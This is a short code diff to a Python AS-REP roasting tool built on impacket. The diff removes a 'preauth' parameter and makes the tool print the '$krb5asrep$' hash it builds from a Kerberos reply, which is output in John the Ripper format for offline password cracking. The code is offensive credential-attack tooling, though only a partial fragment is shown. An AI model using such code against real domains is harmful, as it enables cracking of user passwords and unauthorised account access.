@@ -16,12 +16,11 @@ from impacket.ldap import ldap, ldapasn1
 from impacket.smbconnection import SMBConnection
 import socket
 class TGT:
-    def __init__(self, domain, username, dc, password='', preauth=False, nthash='', lmhash='', aeskey=''):
+    def __init__(self, domain, username, dc, password='', nthash='', lmhash='', aeskey=''):
         self.username = username
         self.domain = domain
         self.password = password
         self.dc = dc
-        self.preauth = preauth
         self.nthash = nthash
         self.lmhash = lmhash
         self.aeskey = aeskey
@@ -102,12 +101,14 @@ class TGT:
         else:
             # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
             raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % self.username)
-
-
-        # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
-        return '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
+        results = '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                                hexlify(asRep['enc-part']['cipher'].asOctets()[:16]),
                                                hexlify(asRep['enc-part']['cipher'].asOctets()[16:]))
+
+        # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
+        print("\n")
+        print(results)
+        return results
 
 
 
